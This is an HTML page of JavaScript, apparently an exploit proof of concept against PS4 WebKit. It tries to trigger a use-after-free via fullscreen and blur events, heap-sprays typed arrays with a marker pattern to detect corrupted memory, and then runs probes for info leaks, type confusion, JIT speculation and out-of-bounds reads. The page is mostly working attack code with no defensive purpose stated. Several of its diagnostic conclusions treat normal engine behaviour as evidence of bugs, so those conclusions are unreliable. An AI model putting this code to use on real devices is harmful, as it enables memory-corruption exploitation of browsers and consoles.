<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF Gated Bug Class Diagnostics</title>
</head>
<body>
<button onclick="run()">RUN UAF DIAGNOSTICS</button>
<pre id="log"></pre>

<script>
const log = s => document.getElementById("log").textContent += s + "\n";

function run() {
    log("=== SETUP: Criando TypedArrays ===");

    let controllers = [];
    const PATTERN = 2.121995791e-314; // 0x4141414141414141

    for (let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        controllers.push(a);
    }

    log("[*] Arrays criados. Entrando em fullscreen...");
    document.documentElement.webkitRequestFullscreen();

    window.onblur = function () {
        log("[*] Blur detectado (OPTIONS). Iniciando spray...");

        let spray = [];
        for (let i = 0; i < 8000; i++) {
            let s = new Float64Array(8);
            s.fill(PATTERN);
            spray.push(s);
        }

        let corrupted = null;
        let idx = -1;
        for (let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                idx = i;
                break;
            }
        }

        if (!corrupted) {
            log("[-] UAF não confirmado nesta execução.");
            return;
        }

        log("[+] UAF CONFIRMADO em controllers[" + idx + "]");

        // ================================
        // CRITICAL: Neutralizar estado
        // ================================
        corrupted.fill(0);
        log("[*] Backing store neutralizado (anti-crash)");

        // Rebuild DOM de forma segura
        document.open();
        document.write("<h3>UAF ativo – rodando diagnósticos</h3>");
        document.close();

        // ================================
        // TESTES DE CLASSE DE BUG
        // ================================
        runDiagnostics();
    };
}

function runDiagnostics() {
    log("\n=== DIAGNÓSTICOS DE CLASSE DE BUG ===");

    testPointerLeak();
    testTypeConfusion();
    testJITSpeculation();
    testOOB();
    testBoundary();

    log("\n=== FIM DOS TESTES ===");
}

/* ===================================================== */
/* TESTE 1 – INFORMATION DISCLOSURE (LEAK)               */
/* ===================================================== */
function testPointerLeak() {
    log("\n[TEST 1] Pointer / Info Leak");

    try {
        let o = {};
        let a = [o, o];
        let s = JSON.stringify(a);
        log("JSON.stringify: " + s);
    } catch {}

    try {
        let e = new Error("x");
        log("Error.stack length: " + (e.stack ? e.stack.length : "null"));
    } catch {}

    log("[RESULT] Se aparecer número tipo endereço → LEAK EXISTE");
}

/* ===================================================== */
/* TESTE 2 – TYPE CONFUSION                              */
/* ===================================================== */
function testTypeConfusion() {
    log("\n[TEST 2] Type Confusion");

    function f(x) { return x.a; }

    let obj = { a: 13.37 };
    let ta = new Float64Array(4);

    for (let i = 0; i < 10000; i++)
        f(obj);

    try {
        let r = f(ta);
        log("Accessing TypedArray as object: " + r);
        log("[!] SE r != undefined → CONFUSÃO");
    } catch (e) {
        log("Exception (esperado): " + e.message);
    }
}

/* ===================================================== */
/* TESTE 3 – JIT MISCOMPILATION                          */
/* ===================================================== */
function testJITSpeculation() {
    log("\n[TEST 3] JIT Speculation");

    function g(x) { return x + 1; }

    for (let i = 0; i < 200000; i++)
        g(1);

    let r1 = g(1);
    let r2 = g("1");

    log("g(1)   = " + r1);
    log("g('1') = " + r2);
    log("[!] Valores inconsistentes/crash → BUG JIT");
}

/* ===================================================== */
/* TESTE 4 – OOB READ                                    */
/* ===================================================== */
function testOOB() {
    log("\n[TEST 4] OOB Read");

    let a = new Float64Array(4);
    a.fill(1.1);

    try {
        let v = a[100];
        log("a[100] = " + v);
        log("[!] SE != undefined → OOB");
    } catch (e) {
        log("Exception (esperado)");
    }
}

/* ===================================================== */
/* TESTE 5 – JS ↔ C++ BOUNDARY                           */
/* ===================================================== */
function testBoundary() {
    log("\n[TEST 5] JS ↔ C++ Boundary");

    try {
        let img = new Image();
        Object.defineProperty(img, "src", {
            get() {
                throw 13.37;
            }
        });
        document.body.appendChild(img);
        log("Image appended safely");
    } catch (e) {
        log("Caught: " + e);
    }

    log("[!] Crash aqui → bug de fronteira");
}
</script>
</body>
</html>

